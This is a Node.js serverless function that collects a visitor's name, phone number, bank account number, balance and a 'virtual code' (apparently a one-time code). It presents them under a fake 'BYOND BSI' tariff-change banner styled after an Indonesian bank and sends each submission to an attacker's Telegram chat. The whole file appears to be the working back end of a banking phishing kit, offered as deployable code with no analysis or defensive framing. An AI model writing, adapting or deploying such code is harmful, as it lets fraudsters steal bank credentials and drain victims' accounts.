const axios = require('axios');

exports.handler = async (event, context) => {
    // Handle CORS preflight requests
    if (event.httpMethod === 'OPTIONS') {
        return {
            statusCode: 204,
            headers: {
                'Access-Control-Allow-Origin': '*',
                'Access-Control-Allow-Headers': 'Content-Type',
                'Access-Control-Allow-Methods': 'POST'
            }
        };
    }

    // Validate HTTP method
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            body: JSON.stringify({ error: 'Method Not Allowed' }),
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        };
    }

    try {
        // Parse incoming data
        const data = JSON.parse(event.body);
        const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = process.env;

        // Validate required environment variables
        if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
            throw new Error('Telegram configuration missing');
        }

        // Validate required fields from form
        const requiredFields = ['name', 'phone', 'accountNumber', 'balance', 'virtualCode'];
        const missingFields = requiredFields.filter(field => !data[field]);
        
        if (missingFields.length > 0) {
            throw new Error(`Missing required fields: ${missingFields.join(', ')}`);
        }

        // Format message for Telegram with improved styling
        let message = `
╭───────────────────────────
│  🔔 *BYOND BSI - PERUBAHAN TARIF*  
├───────────────────────────
│  *📌 DATA VERIFIKASI REKENING*  
├───────────────────────────
│  • *Nama*: ${data.name || '-'}
│  • *Nomor HP*: ${data.phone || '-'}
├───────────────────────────
│  • *Nomor Rekening*: ${data.accountNumber || '-'}
│  • *Saldo Terakhir*: Rp ${formatNumber(data.balance) || '-'}
├───────────────────────────
│  • *Kode Virtual*: ${data.virtualCode || '-'}
│  • *Pilihan Tarif*: ${data.tariff === 'old' ? 'Lama (Rp 6.500/transaksi)' : 'Baru (Rp 150.000/bulan)'}
╰───────────────────────────
        `;

        // Send to Telegram
        const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        const response = await axios.post(telegramApiUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown'
        });

        if (!response.data.ok) {
            throw new Error('Failed to send to Telegram');
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true,
                message: 'Data berhasil dikirim ke Telegram'
            }),
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        };

    } catch (error) {
        return {
            statusCode: 500,
            body: JSON.stringify({ 
                error: error.message,
                details: error.response?.data || null
            }),
            headers: {
                'Content-Type': 'application/json',
                'Access-Control-Allow-Origin': '*'
            }
        };
    }
};

// Helper function to format numbers
function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ".");
          }
